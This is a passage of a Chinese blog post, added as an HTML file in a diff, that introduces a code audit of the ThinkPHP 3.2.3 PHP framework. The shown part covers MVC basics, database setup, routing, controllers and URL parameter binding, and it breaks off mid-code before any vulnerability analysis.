@@ -1,0 +1,2055 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#00FFFF">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#00FFFF">
+
+
+
+
+
+  <meta name="keywords" content="PHP代码审计," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="代码审计之Thinkphp3.2.3">
+<meta name="keywords" content="PHP代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[代码审计]ThinkPHP3.2.3">
+<meta property="og:url" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;index.html">
+<meta property="og:site_name" content="CyzCc&#39;s blog">
+<meta property="og:description" content="代码审计之Thinkphp3.2.3">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587617468272.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587629422032.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587629874670.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587630115032.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587632586503.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587634268134.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587636362189.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587653869748.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587957048476.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587957545707.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587966558672.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587952081549.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587952107733.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587952419329.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587982883610.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587984526886.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587984645897.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588150608736.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588150756344.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588165126864.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588214714395.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588219225919.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588473496097.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588473704606.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588478044142.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588478110812.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588583393508.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588583716549.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584159093.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584224824.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584294380.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584411090.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584737080.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588584841471.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588660627551.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1588661596159.png">
+<meta property="og:updated_time" content="2020-05-05T08:24:14.493Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;cyzcc.vip&#x2F;2020&#x2F;05&#x2F;05&#x2F;ThinkPHP3.2.3&#x2F;1587617468272.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/"/>
+
+
+
+
+<!--留言-->
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "9e261f4f"
+    });
+  daovoice('update');
+  </script>
+
+
+  <title>[代码审计]ThinkPHP3.2.3 | CyzCc's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CyzCc's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">♫日常学习笔记整理♬♬</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主页|随笔">
+          <a href="/home/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主页|随笔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-一些知识点">
+          <a href="/guestbook/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-comments"></i> <br />
+            
+            一些知识点
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cyzcc.vip/2020/05/05/ThinkPHP3.2.3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="CyzCc">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CyzCc's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[代码审计]ThinkPHP3.2.3</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-05T16:14:05+08:00">
+                2020-05-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/05/05/ThinkPHP3.2.3/" class="leancloud_visitors" data-flag-title="[代码审计]ThinkPHP3.2.3">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  9k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  41
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="代码审计之Thinkphp3-2-3"><a href="#代码审计之Thinkphp3-2-3" class="headerlink" title="代码审计之Thinkphp3.2.3"></a>代码审计之Thinkphp3.2.3</h1><a id="more"></a>
+
+<h1 id="MVC讲解"><a href="#MVC讲解" class="headerlink" title="MVC讲解"></a><strong>MVC讲解</strong></h1><p>MVC 和三层结构的认识</p>
+<p>MVC 可以说是一种开发模式，三层结构是一种开发习惯，严格来讲，他们两者是完全不同的概念，但是在实际开发当中又有各种联系；</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MVC  是一种将视图、控制、数据三者分开的一种开发模式；</span><br><span class="line">M  -  Model  模型  工作：编写 model 类，负责数据的操作</span><br><span class="line">V  -  View  视图（模板）  工作：编写 <span class="selector-tag">html</span>  文件，负责前台页面显示</span><br><span class="line">C  -  Controller  控制器  工作：编写类文件，IndexController<span class="selector-class">.class</span><span class="selector-class">.php</span></span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<a href="https://www.cnblogs.com/diyunfei/p/6752618.html" target="_blank" rel="noopener">https://www.cnblogs.com/diyunfei/p/6752618.html</a></p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="http://www.thinkphp.cn/donate/download/id/628.html" target="_blank" rel="noopener">下载地址</a><br><a href="http://document.thinkphp.cn/manual_3_2.html" target="_blank" rel="noopener">thinkphp3.2.3完全开发手册</a></p>
+<p><a href="https://learnku.com/articles/16425/windows-phpstorm-xdebug-breakpoint-debugging" target="_blank" rel="noopener">phpstorm断点调试</a><br><a href="https://www.fuzzer.xyz/2019/03/05/Phpstorm+Xdebug%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE/" target="_blank" rel="noopener">phpstorm断点设置</a></p>
+<p>Thinkphp核心文件介绍：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├─ThinkPHP 框架系统目录（可以部署在非web目录下面）</span><br><span class="line">│  ├─Common       核心公共函数目录</span><br><span class="line">│  ├─Conf         核心配置目录 </span><br><span class="line">│  ├─Lang         核心语言包目录</span><br><span class="line">│  ├─Library      框架类库目录</span><br><span class="line">│  │  ├─Think     核心Think类库包目录</span><br><span class="line">│  │  ├─Behavior  行为类库目录</span><br><span class="line">│  │  ├─Org       Org类库包目录</span><br><span class="line">│  │  ├─Vendor    第三方类库目录</span><br><span class="line">│  │  ├─ .      更多类库目录</span><br><span class="line">│  ├─Mode         框架应用模式目录</span><br><span class="line">│  ├─Tpl          系统模板目录</span><br><span class="line">│  ├─LICENSE<span class="selector-class">.txt</span>  框架授权协议文件</span><br><span class="line">│  ├─logo<span class="selector-class">.png</span>     框架LOGO文件</span><br><span class="line">│  ├─README<span class="selector-class">.txt</span>   框架README文件</span><br><span class="line">│  └─ThinkPHP<span class="selector-class">.php</span> 框架入口文件</span><br></pre></td></tr></table></figure>
+
+<p>创建数据库并连接</p>
+<blockquote>
+<p>新建数据库<br>create database thinkphp3;    use thinkphp3;</p>
+<p>新建表<br>create table thinkphp_user (id int(8) AUTO_INCREMENT PRIMARY KEY,username varchar(255),password varchar(255));</p>
+<p>插入数据<br>insert into thinkphp_user value(1,’admin’,’admin’);</p>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587617468272.png" alt="1587617468272"></p>
+<p>然后连接数据库<br>在Application/Home/Conf/config.php里面配置，要配置的东西可以在Thinkphp/Conf/convention.php里面复制出来<img src="/2020/05/05/ThinkPHP3.2.3/1587629422032.png" alt="1587629422032"><br>测试数据库是否连接成功，可以在Application/Home/Controller里面的indexcontroller.class.php里面添加</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$data = M(<span class="string">'user'</span>)-&gt;where(<span class="string">'id=1'</span>)-&gt;select();</span><br><span class="line">	dump($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问/index.php/home/index/test,如果输出数据库内容便说民连接成功<br><img src="/2020/05/05/ThinkPHP3.2.3/1587629874670.png" alt="1587629874670"></p>
+<p>然后再在config.php里面添加一个<code>&#39;SHOW_PAGE_TRACE&#39;    =&gt;  &#39;true&#39;</code>再次刷新后右下角便会出现调试信息<br><img src="/2020/05/05/ThinkPHP3.2.3/1587630115032.png" alt="1587630115032"></p>
+<h1 id="框架基础"><a href="#框架基础" class="headerlink" title="框架基础"></a>框架基础</h1><p><strong><em>URL访问</em></strong></p>
+<p><code>ThinkPHP</code>采用单一入口模式访问应用，对应用的所有请求都定向到应用的入口文件，系统会从<code>URL</code>参数中解析当前请求的模块、控制器和操作，下面是一个标准的<code>URL</code>访问格式：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种访问方式</span><br><span class="line">http://localhost:/thinkphp/<span class="meta">index</span>.php/Home/<span class="meta">Index</span>/<span class="meta">index</span>　　入口文件/模块/控制器/操作(方法)</span><br><span class="line">第二种访问方式(传参数)</span><br><span class="line">http://localhost:/thinkphp/<span class="meta">index</span>.php?m=Home<span class="variable">&amp;c</span>=<span class="meta">Index</span><span class="variable">&amp;a</span>=<span class="meta">index</span>　　传三个参数</span><br></pre></td></tr></table></figure>
+
+<p>而且访问时不需要区分大小写，无论URL是否开启大小写转换，模块名都会强制小写。</p>
+<p><strong>控制器</strong></p>
+<p>1.控制器的定义</p>
+<p>thinkphp的控制器是一个类，而操作则是控制器类的一个公共方法下面就是一个典型的控制器类的定义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'hello,thinkphp!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法。</p>
+<p>当访问 <code>http://serverName/index.php/Home/Index/hello</code> 后会输出：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hello,</span>thinkphp!</span><br></pre></td></tr></table></figure>
+
+<p><strong>简单测试</strong></p>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587632586503.png" alt="1587632586503"></p>
+<p><strong>实例化控制器</strong></p>
+<p>访问控制器的实例化通常是自动完成的，系统会根据URL地址解析出访问的控制器名称自动实例化，并且调用相关的操作方法。<br>如果需要跨控制器调用的话，则可以单独实例化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化Home模块的User控制器</span></span><br><span class="line">$User = <span class="keyword">new</span> \Home\Controller\UserController();</span><br><span class="line"><span class="comment">// 实例化Admin模块的Blog控制器</span></span><br><span class="line">$Blog = <span class="keyword">new</span> \Admin\Controller\BlogController();</span><br></pre></td></tr></table></figure>
+
+<p>系统为上面的控制器实例化提供了一个快捷调用方法A，上面的代码可以简化为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设当前模块是Home模块</span></span><br><span class="line">$User = A(<span class="string">'User'</span>); $Blog = A(<span class="string">'Admin/Blog'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下，A方法实例化的是默认控制器层（Controller），如果你要实例化其他的分层控制器的话，可以使用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设当前模块是Home模块</span></span><br><span class="line"><span class="comment">// 实例化Event控制器</span></span><br><span class="line">$User = A(<span class="string">'User'</span>,<span class="string">'Event'</span>); </span><br><span class="line">$Blog = A(<span class="string">'Admin/Blog'</span>,<span class="string">'Event'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>上面的代码等效于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实例化Home模块的User事件控制器</span></span><br><span class="line">$User = <span class="keyword">new</span> \Home\Event\UserEvent();</span><br><span class="line"><span class="comment">// 实例化Admin模块的Blog事件控制器</span></span><br><span class="line">$Blog = <span class="keyword">new</span> \Admin\Event\BlogEvent();</span><br></pre></td></tr></table></figure>
+
+<p>实操（跨控制器调用）：在indexcontroller()里面调用usercontroller()里面的get方法<br>先新建一个UserController.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">  			<span class="keyword">echo</span> <span class="string">'这是UserController里面的index方法'</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再IndexController里面新建一个方法调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserindex</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$b = A(<span class="string">'User'</span>);		<span class="comment">//实例化UserController.class.php里面的UserController类</span></span><br><span class="line">	$b-&gt;index();		<span class="comment">//调用UserController类里面的index方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问</p>
+<blockquote>
+<p>thinkphp/index.php/Home/Index/getuserindex</p>
+</blockquote>
+<p><img src="/2020/05/05/ThinkPHP3.2.3/1587634268134.png" alt="1587634268134"></p>
+<p>除了A()方法可以调用之外，R()方法也可以调用，并且更加简单R(‘User/index’);即可</p>
+<p><strong>Action参数绑定</strong></p>
+<p>参数绑定是通过直接绑定URL地址中的变量作为操作方法的参数，可以简化方法的定义甚至路由的解析</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_PARAMS_BIND'</span>       =&gt;  <span class="keyword">true</span>, <span class="comment">// URL变量绑定到操作方法作为参数</span></span><br></pre></td></tr></table></figure>
+
+<p>参数绑定有两种方式：按照变量名绑定和按照变量顺序绑定。</p>
+<p>按变量名绑定</p>
+<p>默认的参数绑定方式是按照变量名进行绑定，例如，我们给Blog控制器定义了两个操作方法read和archive方法，由于read操作需要指定一个id参数，archive方法需要指定年份（year）和月份（month）两个参数，那么我们可以如下定义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'id='</span>.$id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">archive</span><span class="params">($year=<span class="string">'2013'</span>,$month=<span 